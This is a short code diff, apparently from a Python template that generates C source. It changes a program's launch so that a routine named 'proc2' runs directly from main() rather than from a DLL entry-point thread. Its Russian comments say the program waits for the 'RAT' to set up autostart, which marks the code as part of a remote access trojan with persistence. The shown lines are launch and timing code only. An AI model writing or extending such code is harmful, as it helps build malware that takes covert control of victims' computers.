@@ -136,16 +136,12 @@ void proc2() {{
     free(out);
 }}
 
-BOOL APIENTRY entry(HMODULE h, DWORD r, LPVOID) {{
-    if (r == DLL_PROCESS_ATTACH) {{
-        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)proc2, NULL, 0, NULL);
-    }}
-    return TRUE;
-}}
-
 int main() {{
-    entry(GetModuleHandleA(NULL), DLL_PROCESS_ATTACH, NULL);
-    while(1) Sleep(1000);
+    // Запускаем proc2 напрямую, без DLL entry point
+    proc2();
+    
+    // Ждем пока RAT сделает автозагрузку
+    Sleep(15000);
     return 0;
 }}
 '''
